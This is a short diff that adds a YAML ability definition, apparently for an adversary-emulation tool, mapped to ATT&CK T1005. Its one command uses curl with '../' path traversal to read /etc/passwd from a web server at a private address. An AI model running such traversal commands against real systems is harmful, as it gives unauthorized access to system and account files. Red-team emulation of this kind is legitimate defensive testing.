@@ -1,0 +1,14 @@
+- id: dir-traversal
+  name: Directory Traversal
+  description: Exploit directory traversal to access restricted files.
+  tactic: discovery
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    linux:
+      sh:
+        command: "curl http://10.110.231.127:8000/../../../etc/passwd"
+        parsers:
+          - source: stdout
+            keys: ["output"]
